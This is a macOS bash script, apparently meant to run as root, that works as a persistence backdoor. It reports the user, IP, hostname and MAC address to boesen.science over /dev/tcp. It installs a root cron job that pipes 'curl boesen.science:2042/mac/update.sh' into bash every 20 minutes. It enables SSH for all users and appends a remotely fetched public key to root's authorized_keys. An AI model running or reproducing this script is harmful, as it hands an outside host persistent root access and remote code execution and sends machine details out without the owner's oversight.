#!/usr/bin/env bash

# ifconfig is in /sbin and won't work with default PATH
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

user=$(stat -f "%Su" /dev/console)
# Linux's hostname -I doesn't work on Macs
ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | paste -sd ',' -)
hostname=$(hostname)
mac=$(/sbin/ifconfig en0 | awk '/ether/{print $2}')

info="$user $ip $hostname $mac"

server="boesen.science"
port=2043

ip_new=false
if ! grep -q "^$ip$" /etc/ips; then
	echo $ip >> /etc/ips
	ip_new=true
fi

if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
	printf "$user $hostname" > /etc/info

	printf "UPDATE: $info" >/dev/tcp/$server/$port
fi

grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh |bash' >> /tmp/crontab
mv /tmp/crontab /var/at/tabs/root

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null

sshpath="/var/root/.ssh"

mkdir -p "$sshpath"

if ! grep boesene $sshpath/authorized_keys; then
	curl -L boesen.science:2042/pubkey >> $sshpath/authorized_keys
fi
